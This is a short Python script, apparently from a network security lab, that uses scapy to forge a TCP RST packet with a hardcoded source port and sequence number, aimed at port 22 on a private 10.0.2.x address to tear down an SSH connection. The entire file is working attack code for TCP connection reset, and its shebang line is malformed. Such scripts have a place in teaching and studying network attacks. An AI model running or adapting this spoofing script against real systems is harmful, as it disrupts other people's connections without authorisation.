#!use/bin/python3
from scapy.all import *
import sys

s_port = 60348
sequence = 2557826305

print("Sending RST Packet..")
ip = IP(src='10.0.2.9',dst='10.0.2.8')
tcp = TCP(sport=s_port,dport=22,flags="R",seq=sequence)
pkt=ip/tcp
pkt.show()
send(pkt,verbose=0)